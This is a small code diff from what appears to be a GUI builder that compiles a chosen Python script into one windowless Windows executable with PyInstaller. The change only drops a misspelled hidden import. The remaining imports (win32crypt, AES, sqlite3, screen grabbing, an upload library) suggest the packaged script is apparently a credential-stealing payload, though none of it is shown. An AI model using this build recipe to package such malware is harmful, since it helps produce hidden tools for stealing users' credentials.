@@ -428,7 +428,7 @@ class App(customtkinter.CTk):
             exeicon = self.iconpath
 
         os.system(
-            f'''python -m PyInstaller --onefile --clean --noconsole --upx-dir=./tools --distpath ./ --hidden-import base64 --hidden-import ctypes --hidden-import json --hidden-import re --hidden-import time --hidden-import subprocess --hidden-import sys --hidden-import sqlite3 --hidden-import requests_toolbelt --hidden-import threadin --hidden-import psutil --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import Crypto --hidden-import Crypto.Cipher.AES --hidden-import win32crypt --icon {exeicon} .\\{filename}.py''')
+            f'''python -m PyInstaller --onefile --clean --noconsole --upx-dir=./tools --distpath ./ --hidden-import base64 --hidden-import ctypes --hidden-import json --hidden-import re --hidden-import time --hidden-import subprocess --hidden-import sys --hidden-import sqlite3 --hidden-import requests_toolbelt --hidden-import psutil --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import Crypto --hidden-import Crypto.Cipher.AES --hidden-import win32crypt --icon {exeicon} .\\{filename}.py''')
 
 
     def cleanup_files(self, filename):
